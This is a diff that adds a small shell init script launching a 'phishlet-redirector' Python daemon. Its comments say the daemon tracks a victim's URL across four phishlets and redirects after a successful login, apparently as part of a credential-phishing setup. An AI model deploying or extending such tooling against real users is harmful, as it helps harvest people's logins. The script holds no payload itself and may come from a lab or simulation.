@@ -1,0 +1,15 @@
+#!/bin/sh
+# Start the phishlet-redirector daemon. It runs in a loop, tracking the
+# victim's current URL across all 4 phishlets and triggering a redirect
+# on successful login.
+
+if [ ! -f /opt/phishlet-redirector.py ]; then
+  echo "[phishlet-redirector] /opt/phishlet-redirector.py missing, daemon not started"
+  exit 0
+fi
+
+echo "[phishlet-redirector] starting daemon (PID $$ shell, daemon gets its own)"
+su -s /bin/sh app -c "DISPLAY=:0 python3 /opt/phishlet-redirector.py" < /dev/null > /dev/null 2>&1 &
+
+echo "[phishlet-redirector] init done"
+exit 0
